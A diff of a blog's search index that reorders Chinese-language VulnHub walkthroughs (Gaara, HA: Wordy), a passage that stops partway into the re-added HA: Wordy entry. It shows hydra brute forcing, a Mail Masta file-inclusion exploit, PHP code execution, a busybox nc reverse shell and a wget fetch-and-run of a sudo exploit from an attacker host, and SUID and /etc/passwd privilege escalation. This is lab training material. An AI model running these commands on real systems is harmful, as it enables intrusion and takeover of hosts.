@@ -125,95 +125,6 @@
       </tags>
   </entry>
   <entry>
-    <title>Gaara Walkthrough</title>
-    <url>/2025/03/26/Gaara/</url>
-    <content><![CDATA[<h1 id="Gaara-Walkthrough"><a href="#Gaara-Walkthrough" class="headerlink" title="Gaara Walkthrough"></a>Gaara Walkthrough</h1><h2 id="Box-Info"><a href="#Box-Info" class="headerlink" title="Box Info"></a>Box Info</h2><p>官网在这里：<a href="https://www.vulnhub.com/entry/gaara-1,629/">Gaara: 1</a></p>
-<p><img src="/picture/image-20250326123110685.png" alt="image-20250326123110685"></p>
-<h2 id="The-Hack"><a href="#The-Hack" class="headerlink" title="The Hack"></a>The Hack</h2><p>先对目标主机做端口发现</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo nmap -p- 172.16.33.69</span><br></pre></td></tr></table></figure>
-
-<p>目标主机开放 22、80 端口</p>
-<p><img src="/picture/image-20250326110434275.png" alt="image-20250326110434275"></p>
-<p>对开放的端口进行应用版本发现</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo nmap -p22,80 -A -T4 172.16.33.69 </span><br></pre></td></tr></table></figure>
-
-<p>22 端口开放 SSH 服务，80 端口开放 http 服务</p>
-<p><img src="/picture/image-20250326110603058.png" alt="image-20250326110603058"></p>
-<p>先来看 SSH 服务，尝试弱口令远程登陆，同时看看能不能泄露机密信息</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh root@172.16.33.69</span><br></pre></td></tr></table></figure>
-
-<p>可惜失败了</p>
-<p><img src="/picture/image-20250326110715391.png" alt="image-20250326110715391"></p>
-<p>那么暂时就拿 22 端口没办法了，再来看看 80 端口，进行目录发现</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dirsearch -u http://172.16.33.69</span><br></pre></td></tr></table></figure>
-
-<p>呃，一个都没扫描的？</p>
-<p><img src="/picture/image-20250326111411455.png" alt="image-20250326111411455"></p>
-<p>直接访问目标站点看看？</p>
-<p>仅为一张图片</p>
-<p><img src="/picture/image-20250326111749132.png" alt="image-20250326111749132"></p>
-<p>但是图片右下角泄露了邮箱，后半段甚至可以是域名</p>
-<p><img src="/picture/image-20250326111812291.png" alt="image-20250326111812291"></p>
-<p>将目标主机 IP 和域名绑定，再次访问试试看</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo vi /etc/hosts</span><br></pre></td></tr></table></figure>
-
-<p><img src="/picture/image-20250326111939206.png" alt="image-20250326111939206"></p>
-<p>可惜的是还是不行，看来还有隐藏目录我们没发现，尝试结合字典对目标站点进行目录发现</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dirsearch -u http://172.16.33.69 -w /usr/share/wordlists/dirb/big.txt</span><br><span class="line">dirsearch -u http://172.16.33.69 -w /usr/share/wordlists/dirb/common.txt </span><br><span class="line">dirsearch -u http://172.16.33.69 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt </span><br></pre></td></tr></table></figure>
-
-<p>幸运的是，找到了 &#x2F;Cryoserver 目录</p>
-<p><img src="/picture/image-20250326111308782.png" alt="image-20250326111308782"></p>
-<p>眼看起来啥也没有，但是我在右边看到了滚动进度条，在进度条最底下看到了额外的三个目录</p>
-<p><img src="/picture/image-20250326112630153.png" alt="image-20250326112630153"></p>
-<p>在 &#x2F;iamgara 里面找到了可疑字符串</p>
-<p><img src="/picture/image-20250326113032549.png" alt="image-20250326113032549"></p>
-<p>CyberChef 没跑出来？有点怪啊</p>
-<p><img src="/picture/image-20250326114624494.png" alt="image-20250326114624494"></p>
-<p>既然网站都是关于 Gaara 的描述，那看看能不能用该用户名爆破 SSH 密码</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hydra -e nsr -l gaara -P /usr/share/wordlists/rockyou.txt ssh://172.16.33.69</span><br></pre></td></tr></table></figure>
-
-<p>幸运的是，密码被爆破出来了</p>
-<p><img src="/picture/image-20250326115056046.png" alt="image-20250326115056046"></p>
-<p>直接 SSH 远程登陆</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh gaara@172.16.33.69</span><br></pre></td></tr></table></figure>
-
-<p>成功突破边界</p>
-<p><img src="/picture/image-20250326115157844.png" alt="image-20250326115157844"></p>
-<p>获得 flag.txt</p>
-<p><img src="/picture/image-20250326115555231.png" alt="image-20250326115555231"></p>
-<p>同时发现可疑文件 Kazekage.txt ，内容似乎是 base64 编码，解密出来是一个目录</p>
-<p><img src="/picture/image-20250326115855797.png" alt="image-20250326115855797"></p>
-<p>在目录内发现抽象密文</p>
-<p><img src="/picture/image-20250326120609244.png" alt="image-20250326120609244"></p>
-<p>可通过在线工具 <a href="https://copy.sh/brainfuck/">El Brainfuck</a> 进行解密，看起来是烟雾弹</p>
-<p><img src="/picture/image-20250326120716583.png" alt="image-20250326120716583"></p>
-<p>看看 sudo 版本</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gaara@Gaara:~$ sudo -V</span><br><span class="line">Sudo version 1.8.27</span><br><span class="line">sudo: unable to resolve host Gaara: Temporary failure <span class="keyword">in</span> name resolution</span><br><span class="line">Sudoers policy plugin version 1.8.27</span><br><span class="line">Sudoers file grammar version 46</span><br><span class="line">Sudoers I/O plugin version 1.8.27</span><br></pre></td></tr></table></figure>
-
-<p>看起来可以使用 CVE-2021-3156 提权</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /tmp</span><br><span class="line">wget http://10.8.0.90/exploit_nss.py -O exp.py</span><br><span class="line">chmod +x exp.py</span><br><span class="line">python exp.py</span><br></pre></td></tr></table></figure>
-
-<p>成功获得 root 权限</p>
-<p><img src="/picture/image-20250326121834252.png" alt="image-20250326121834252"></p>
-<p>获得 root.txt</p>
-<p><img src="/picture/image-20250326121912200.png" alt="image-20250326121912200"></p>
-<p>当然，在查找哪些文件具有 SUID 权限时，发现了 gdb 文件</p>
-<p><img src="/picture/image-20250326122634005.png" alt="image-20250326122634005"></p>
-<p>直接切换至 &#x2F;usr&#x2F;bin 目录，执行</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./gdb -nx -ex &#x27;python import os; os.execl(&quot;/bin/sh&quot;, &quot;sh&quot;, &quot;-p&quot;)&#x27; -ex quit</span><br></pre></td></tr></table></figure>
-
-<p>可直接提权成功</p>
-<p><img src="/picture/image-20250326122802782.png" alt="image-20250326122802782"></p>
-]]></content>
-      <categories>
-        <category>Penetration Testing</category>
-      </categories>
-      <tags>
-        <tag>Penetration Testing</tag>
-        <tag>vulnhub</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Born2root Walkthrough</title>
     <url>/2025/03/23/Born2root/</url>
     <content><![CDATA[<h1 id="Born2root-Walkthrough"><a href="#Born2root-Walkthrough" class="headerlink" title="Born2root Walkthrough"></a>Born2root Walkthrough</h1><h2 id="Box-Info"><a href="#Box-Info" class="headerlink" title="Box Info"></a>Box Info</h2><p>官网在这里：[Born2Root: 1](<a href="https://www.vulnhub.com/entry/born2root-1,197/">Born2Root: 1 ~ VulnHub</a>)</p>
@@ -299,115 +210,85 @@
       </tags>
   </entry>
   <entry>
-    <title>HAWordy Walkthrough</title>
-    <url>/2025/03/24/HAWordy/</url>
-    <content><![CDATA[<h1 id="HA-Wordy-Walkthrough"><a href="#HA-Wordy-Walkthrough" class="headerlink" title="HA: Wordy Walkthrough"></a>HA: Wordy Walkthrough</h1><h2 id="Box-Info"><a href="#Box-Info" class="headerlink" title="Box Info"></a>Box Info</h2><p>官网在这里：<a href="https://www.vulnhub.com/entry/ha-wordy,363/">HA: Wordy</a> </p>
-<p><img src="/picture/image-20250322192153885.png" alt="image-20250322192153885"></p>
-<h2 id="The-Hack"><a href="#The-Hack" class="headerlink" title="The Hack"></a>The Hack</h2><p>先进行端口扫描</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ sudo nmap -p- 172.16.33.108             </span><br><span class="line">[sudo] password <span class="keyword">for</span> kali: </span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-21 21:21 EDT</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 172.16.33.108 (172.16.33.108)</span><br><span class="line">Host is up (0.033s latency).</span><br><span class="line">Not shown: 65534 closed tcp ports (reset)</span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">80/tcp open  http</span><br></pre></td></tr></table></figure>
+    <title>Gaara Walkthrough</title>
+    <url>/2025/03/26/Gaara/</url>
+    <content><![CDATA[<h1 id="Gaara-Walkthrough"><a href="#Gaara-Walkthrough" class="headerlink" title="Gaara Walkthrough"></a>Gaara Walkthrough</h1><h2 id="Box-Info"><a href="#Box-Info" class="headerlink" title="Box Info"></a>Box Info</h2><p>官网在这里：<a href="https://www.vulnhub.com/entry/gaara-1,629/">Gaara: 1</a></p>
+<p><img src="/picture/image-20250326123110685.png" alt="image-20250326123110685"></p>
+<h2 id="The-Hack"><a href="#The-Hack" class="headerlink" title="The Hack"></a>The Hack</h2><p>先对目标主机做端口发现</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo nmap -p- 172.16.33.69</span><br></pre></td></tr></table></figure>
 
-<p>看来目标主机只开放了 80 端口，进一步做应用版本发现</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ sudo nmap -p 80 -A -T4 172.16.33.108 </span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-21 21:22 EDT</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 172.16.33.108 (172.16.33.108)</span><br><span class="line">Host is up (0.033s latency).</span><br><span class="line"></span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))</span><br><span class="line">|_http-title: Apache2 Ubuntu Default Page: It works</span><br><span class="line">|_http-server-header: Apache/2.4.29 (Ubuntu)</span><br></pre></td></tr></table></figure>
+<p>目标主机开放 22、80 端口</p>
+<p><img src="/picture/image-20250326110434275.png" alt="image-20250326110434275"></p>
+<p>对开放的端口进行应用版本发现</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo nmap -p22,80 -A -T4 172.16.33.69 </span><br></pre></td></tr></table></figure>
 
-<p>80 开放的是 Apache httpd 服务，版本为 2.4.29 ，过高，漏洞较难利用，接下来尝试进行 WEB 目录扫描</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dirsearch -u http://172.16.33.108/</span><br></pre></td></tr></table></figure>
+<p>22 端口开放 SSH 服务，80 端口开放 http 服务</p>
+<p><img src="/picture/image-20250326110603058.png" alt="image-20250326110603058"></p>
+<p>先来看 SSH 服务，尝试弱口令远程登陆，同时看看能不能泄露机密信息</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh root@172.16.33.69</span><br></pre></td></tr></table></figure>
 
-<p>发现 wp 目录和登陆界面，猜测是 wp 构建的网站，同时发现 info.php ，但内容仅为目标主机 IP</p>
-<p><img src="/picture/image-20250322114239464.png" alt="image-20250322114239464"></p>
-<p>访问 &#x2F;wordpress&#x2F;wp-login.php ，尝试输入账户名和密码，发现存在用户名枚举漏洞，存在 admin 账户</p>
-<p><img src="/picture/image-20250322114635271.png" alt="image-20250322114635271"></p>
-<p><img src="/picture/image-20250322114713974.png" alt="image-20250322114713974"></p>
-<p>用户名确定，可以试试密码爆破</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hydra -l admin -P /usr/share/wordlists/rockyou.txt -f -t 4 172.16.33.108 http-post-form &#x27;/wordpress/wp-login.php:log=^USER^&amp;pwd=^PASS^&amp;wp-submit=Log+In&amp;redirect_to=http%3A%2F%2F172.16.33.108%2Fwordpress%2Fwp-admin%2F&amp;testcookie=1:F=is incorrect&#x27;</span><br></pre></td></tr></table></figure>
+<p>可惜失败了</p>
+<p><img src="/picture/image-20250326110715391.png" alt="image-20250326110715391"></p>
+<p>那么暂时就拿 22 端口没办法了，再来看看 80 端口，进行目录发现</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dirsearch -u http://172.16.33.69</span><br></pre></td></tr></table></figure>
 
-<p>发送的参数可以在开发者工具中的 NetWork 中找到</p>
-<p><img src="/picture/image-20250322114916400.png" alt="image-20250322114916400"></p>
-<p>可惜，rockyou 没跑出来，说明密码十分复杂</p>
-<p><img src="/picture/image-20250322115026326.png" alt="image-20250322115026326"></p>
-<p>既然是 wp 构建的，使用 wpscan 扫扫看</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wpscan --url http://172.16.33.108/wordpress --enumerate u,ap,at --disable-tls-checks</span><br></pre></td></tr></table></figure>
+<p>呃，一个都没扫描的？</p>
+<p><img src="/picture/image-20250326111411455.png" alt="image-20250326111411455"></p>
+<p>直接访问目标站点看看？</p>
+<p>仅为一张图片</p>
+<p><img src="/picture/image-20250326111749132.png" alt="image-20250326111749132"></p>
+<p>但是图片右下角泄露了邮箱，后半段甚至可以是域名</p>
+<p><img src="/picture/image-20250326111812291.png" alt="image-20250326111812291"></p>
+<p>将目标主机 IP 和域名绑定，再次访问试试看</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo vi /etc/hosts</span><br></pre></td></tr></table></figure>
 
-<p>发现了一些目录：</p>
-<p><img src="/picture/image-20250322132718031.png" alt="image-20250322132718031"></p>
-<p>访问 readme ，只是一个下载引导页面</p>
-<p><img src="/picture/image-20250322132911433.png" alt="image-20250322132911433"></p>
-<p>再来看主题，为 twentysixteen Version: 2.0，提示似乎有点过时了</p>
-<p><img src="/picture/image-20250322133149081.png" alt="image-20250322133149081"></p>
-<p>去网上搜搜看对应版本是否有漏洞，可惜没有搜索到</p>
-<p>再来看插件，分别是</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mail-masta version 1.0</span><br><span class="line">reflex-gallery Version: 3.1.3</span><br><span class="line">site-editor Version: 1.1.1</span><br><span class="line">slideshow-gallery Version: 1.4.6</span><br><span class="line">wp-easycart-data (?)</span><br><span class="line">wp-support-plus-responsive-ticket-system Version: 7.1.3</span><br><span class="line">wp-symposium Version: 15.1</span><br></pre></td></tr></table></figure>
+<p><img src="/picture/image-20250326111939206.png" alt="image-20250326111939206"></p>
+<p>可惜的是还是不行，看来还有隐藏目录我们没发现，尝试结合字典对目标站点进行目录发现</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dirsearch -u http://172.16.33.69 -w /usr/share/wordlists/dirb/big.txt</span><br><span class="line">dirsearch -u http://172.16.33.69 -w /usr/share/wordlists/dirb/common.txt </span><br><span class="line">dirsearch -u http://172.16.33.69 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt </span><br></pre></td></tr></table></figure>
 
-<p>我们一个一个来，先是 mail-masta ，幸运的是，在 <a href="https://www.exploit-db.com/exploits/40290">WordPress Plugin Mail Masta 1.0 - Local File Inclusion</a> 页面能找到对应版本漏洞利用代码，而且通过 wpscan 的扫描我们得知，该 wp 服务的文件上传路径是默认的 &#x2F;wp-content 目录，那么就可以直接利用代码</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://172.16.33.108/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd</span><br></pre></td></tr></table></figure>
+<p>幸运的是，找到了 &#x2F;Cryoserver 目录</p>
+<p><img src="/picture/image-20250326111308782.png" alt="image-20250326111308782"></p>
+<p>眼看起来啥也没有，但是我在右边看到了滚动进度条，在进度条最底下看到了额外的三个目录</p>
+<p><img src="/picture/image-20250326112630153.png" alt="image-20250326112630153"></p>
+<p>在 &#x2F;iamgara 里面找到了可疑字符串</p>
+<p><img src="/picture/image-20250326113032549.png" alt="image-20250326113032549"></p>
+<p>CyberChef 没跑出来？有点怪啊</p>
+<p><img src="/picture/image-20250326114624494.png" alt="image-20250326114624494"></p>
+<p>既然网站都是关于 Gaara 的描述，那看看能不能用该用户名爆破 SSH 密码</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hydra -e nsr -l gaara -P /usr/share/wordlists/rockyou.txt ssh://172.16.33.69</span><br></pre></td></tr></table></figure>
 
-<p>成功</p>
-<p><img src="/picture/image-20250322140134547.png" alt="image-20250322140134547"></p>
-<p>看看能不能包含 apache 服务日志：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://172.16.33.108/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/apache2/sites-enabled/000-default.conf</span><br></pre></td></tr></table></figure>
+<p>幸运的是，密码被爆破出来了</p>
+<p><img src="/picture/image-20250326115056046.png" alt="image-20250326115056046"></p>
+<p>直接 SSH 远程登陆</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh gaara@172.16.33.69</span><br></pre></td></tr></table></figure>
 
-<p>可以包含，那么就尝试 apache 日志包含，可惜失败了，尝试通过伪协议执行命令</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -X POST -d &quot;&lt;?php system(&#x27;id&#x27;); ?&gt;&quot; &quot;http://172.16.33.108/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=php://input&quot;</span><br></pre></td></tr></table></figure>
+<p>成功突破边界</p>
+<p><img src="/picture/image-20250326115157844.png" alt="image-20250326115157844"></p>
+<p>获得 flag.txt</p>
+<p><img src="/picture/image-20250326115555231.png" alt="image-20250326115555231"></p>
+<p>同时发现可疑文件 Kazekage.txt ，内容似乎是 base64 编码，解密出来是一个目录</p>
+<p><img src="/picture/image-20250326115855797.png" alt="image-20250326115855797"></p>
+<p>在目录内发现抽象密文</p>
+<p><img src="/picture/image-20250326120609244.png" alt="image-20250326120609244"></p>
+<p>可通过在线工具 <a href="https://copy.sh/brainfuck/">El Brainfuck</a> 进行解密，看起来是烟雾弹</p>
+<p><img src="/picture/image-20250326120716583.png" alt="image-20250326120716583"></p>
+<p>看看 sudo 版本</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gaara@Gaara:~$ sudo -V</span><br><span class="line">Sudo version 1.8.27</span><br><span class="line">sudo: unable to resolve host Gaara: Temporary failure <span class="keyword">in</span> name resolution</span><br><span class="line">Sudoers policy plugin version 1.8.27</span><br><span class="line">Sudoers file grammar version 46</span><br><span class="line">Sudoers I/O plugin version 1.8.27</span><br></pre></td></tr></table></figure>
 
-<p>成功执行</p>
-<p><img src="/picture/image-20250322143747568.png" alt="image-20250322143747568"></p>
-<p>尝试反弹 shell </p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -X POST -d &quot;&lt;?php system(&#x27;busybox nc 10.8.0.90 1234 -e /bin/bash&#x27;); ?&gt;&quot; &quot;http://172.16.33.108/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=php://input&quot;</span><br></pre></td></tr></table></figure>
+<p>看起来可以使用 CVE-2021-3156 提权</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /tmp</span><br><span class="line">wget http://10.8.0.90/exploit_nss.py -O exp.py</span><br><span class="line">chmod +x exp.py</span><br><span class="line">python exp.py</span><br></pre></td></tr></table></figure>
 
-<p>同时开启 nc 监听：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -nvlp 1234</span><br></pre></td></tr></table></figure>
+<p>成功获得 root 权限</p>
+<p><img src="/picture/image-20250326121834252.png" alt="image-20250326121834252"></p>
+<p>获得 root.txt</p>
+<p><img src="/picture/image-20250326121912200.png" alt="image-20250326121912200"></p>
+<p>当然，在查找哪些文件具有 SUID 权限时，发现了 gdb 文件</p>
+<p><img src="/picture/image-20250326122634005.png" alt="image-20250326122634005"></p>
+<p>直接切换至 &#x2F;usr&#x2F;bin 目录，执行</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./gdb -nx -ex &#x27;python import os; os.execl(&quot;/bin/sh&quot;, &quot;sh&quot;, &quot;-p&quot;)&#x27; -ex quit</span><br></pre></td></tr></table></figure>
 
-<p>反弹成功</p>
-<p><img src="/picture/image-20250322144039742.png" alt="image-20250322144039742"></p>
-<p>在 &#x2F;home&#x2F;raj 目录下找到第一个 flag</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">aHR0cHM6Ly93d3cuaGFja2luZ2FydGljbGVzLmlu</span><br></pre></td></tr></table></figure>
-
-<p><img src="/picture/image-20250322172934353.png" alt="image-20250322172934353"></p>
-<p>接下来就是提权，在工作目录下的 &#x2F;html 目录中，发现可疑文件，意思是需要 ZIP 来解决</p>
-<p><img src="/picture/image-20250322145304048.png" alt="image-20250322145304048"></p>
-<p>本机编写接收程序，将 zip 文件上传到宿主机上</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> http.server <span class="keyword">import</span> SimpleHTTPRequestHandler, HTTPServer</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">UploadHandler</span>(<span class="title class_ inherited__">SimpleHTTPRequestHandler</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">do_POST</span>(<span class="params">self</span>):</span><br><span class="line">        content_length = <span class="built_in">int</span>(self.headers[<span class="string">&#x27;Content-Length&#x27;</span>])</span><br><span class="line">        post_data = self.rfile.read(content_length)</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;secret.zip&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(post_data)</span><br><span class="line">        self.send_response(<span class="number">200</span>)</span><br><span class="line">        self.end_headers()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    server = HTTPServer((<span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="number">8000</span>), UploadHandler)</span><br><span class="line">    server.serve_forever()</span><br></pre></td></tr></table></figure>
-
-<p>启动接受服务</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 upload_server.py</span><br></pre></td></tr></table></figure>
-
-<p>在目标主机上执行：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget --post-file=secret.zip --header=&quot;Content-Type: application/octet-stream&quot; http://172.16.33.108:8000/</span><br></pre></td></tr></table></figure>
-
-<p>接收成功，解压时发现需要密码</p>
-<p><img src="/picture/image-20250322153224623.png" alt="image-20250322153224623"></p>
-<p>将密码哈希保存为字典，使用 john 破译</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">zip2john secret.zip &gt; secret.txt  </span><br><span class="line">john --wordlist=/usr/share/wordlists/rockyou.txt secret.txt</span><br></pre></td></tr></table></figure>
-
-<p>又没跑出密码，看来得在目标主机里找了（</p>
-<p><img src="/picture/image-20250322153600657.png" alt="image-20250322153600657"></p>
-<p>再来枚举其他信息，看看有什么文件具有 SUID 权限：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
-
-<p>看到了一个有趣的东西：</p>
-<p><img src="/picture/image-20250322181011381.png" alt="image-20250322181011381"></p>
-<p>尝试使用 wget 的 SUID 提权，由于需要写入文件，所以进入 tmp 目录</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">www-data@ubuntu:/var/www/html/wordpress$ <span class="built_in">cd</span> /tmp</span><br><span class="line">www-data@ubuntu:/tmp$ TF=$(<span class="built_in">mktemp</span>)</span><br><span class="line">www-data@ubuntu:/tmp$ <span class="built_in">chmod</span> +x <span class="variable">$TF</span></span><br><span class="line">www-data@ubuntu:/tmp$ <span class="built_in">echo</span> -e <span class="string">&#x27;#!/bin/sh -p\n/bin/sh -p 1&gt;&amp;0&#x27;</span> &gt;<span class="variable">$TF</span></span><br><span class="line">www-data@ubuntu:/tmp$ wget --use-askpass=<span class="variable">$TF</span> 0</span><br></pre></td></tr></table></figure>
-
-<p>利用成功</p>
-<p><img src="/picture/image-20250322181324853.png" alt="image-20250322181324853"></p>
-<p>接下来就是进入 root 目录获得最终 flag</p>
- <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># cd /root</span></span><br><span class="line"><span class="comment"># ls -la</span></span><br><span class="line"><span class="comment"># cat proof.txt</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="/picture/image-20250322181504137.png" alt="image-20250322181504137"></p>
-<p>或者可以使用 cp 命令</p>
-<p>将目标主机上的 &#x2F;etc&#x2F;passwd 文件内容拷贝至主机，生成已知的密码哈希（123）</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ openssl passwd -1 123</span><br><span class="line">$1$/l/LdaOy<span class="variable">$E0kBkOBauSctDWdECVk9r</span>.</span><br></pre></td></tr></table></figure>
-
-<p>在本地生成 passwd 文件，通过 goshs 上传至目标主机 tmp 目录，将上传的 passwd 拷贝覆盖原 &#x2F;etc&#x2F;passwd ，最后经过 su 提权</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /tmp</span><br><span class="line">wget http://10.8.0.90/passwd</span><br><span class="line">cp passwd /etc/passwd</span><br><span class="line">su # 输入密码 123</span><br></pre></td></tr></table></figure>
-
-<p><img src="/picture/image-20250322202054503.png" alt="image-20250322202054503"></p>
-<p>当然，直接 wget 覆盖 &#x2F;etc&#x2F;passwd 也可以</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget http://10.8.0.90/passwd -O /etc/passwd</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p> 看来 secret.zip 是兔子洞，误导你的</p>
-</blockquote>
+<p>可直接提权成功</p>
+<p><img src="/picture/image-20250326122802782.png" alt="image-20250326122802782"></p>
 ]]></content>
       <categories>
         <category>Penetration Testing</category>
@@ -539,6 +420,125 @@
       </tags>
   </entry>
   <entry>
+    <title>HAWordy Walkthrough</title>
+    <url>/2025/03/24/HAWordy/</url>
+    <content><![CDATA[<h1 id="HA-Wordy-Walkthrough"><a href="#HA-Wordy-Walkthrough" class="headerlink" title="HA: Wordy Walkthrough"></a>HA: Wordy Walkthrough</h1><h2 id="Box-Info"><a href="#Box-Info" class="headerlink" title="Box Info"></a>Box Info</h2><p>官网在这里：<a href="https://www.vulnhub.com/entry/ha-wordy,363/">HA: Wordy</a> </p>
+<p><img src="/picture/image-20250322192153885.png" alt="image-20250322192153885"></p>
+<h2 id="The-Hack"><a href="#The-Hack" class="headerlink" title="The Hack"></a>The Hack</h2><p>先进行端口扫描</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ sudo nmap -p- 172.16.33.108             </span><br><span class="line">[sudo] password <span class="keyword">for</span> kali: </span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-21 21:21 EDT</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 172.16.33.108 (172.16.33.108)</span><br><span class="line">Host is up (0.033s latency).</span><br><span class="line">Not shown: 65534 closed tcp ports (reset)</span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">80/tcp open  http</span><br></pre></td></tr></table></figure>
+
+<p>看来目标主机只开放了 80 端口，进一步做应用版本发现</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ sudo nmap -p 80 -A -T4 172.16.33.108 </span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-21 21:22 EDT</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 172.16.33.108 (172.16.33.108)</span><br><span class="line">Host is up (0.033s latency).</span><br><span class="line"></span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))</span><br><span class="line">|_http-title: Apache2 Ubuntu Default Page: It works</span><br><span class="line">|_http-server-header: Apache/2.4.29 (Ubuntu)</span><br></pre></td></tr></table></figure>
+
+<p>80 开放的是 Apache httpd 服务，版本为 2.4.29 ，过高，漏洞较难利用，接下来尝试进行 WEB 目录扫描</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dirsearch -u http://172.16.33.108/</span><br></pre></td></tr></table></figure>
+
+<p>发现 wp 目录和登陆界面，猜测是 wp 构建的网站，同时发现 info.php ，但内容仅为目标主机 IP</p>
+<p><img src="/picture/image-20250322114239464.png" alt="image-20250322114239464"></p>
+<p>访问 &#x2F;wordpress&#x2F;wp-login.php ，尝试输入账户名和密码，发现存在用户名枚举漏洞，存在 admin 账户</p>
+<p><img src="/picture/image-20250322114635271.png" alt="image-20250322114635271"></p>
+<p><img src="/picture/image-20250322114713974.png" alt="image-20250322114713974"></p>
+<p>用户名确定，可以试试密码爆破</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hydra -l admin -P /usr/share/wordlists/rockyou.txt -f -t 4 172.16.33.108 http-post-form &#x27;/wordpress/wp-login.php:log=^USER^&amp;pwd=^PASS^&amp;wp-submit=Log+In&amp;redirect_to=http%3A%2F%2F172.16.33.108%2Fwordpress%2Fwp-admin%2F&amp;testcookie=1:F=is incorrect&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>发送的参数可以在开发者工具中的 NetWork 中找到</p>
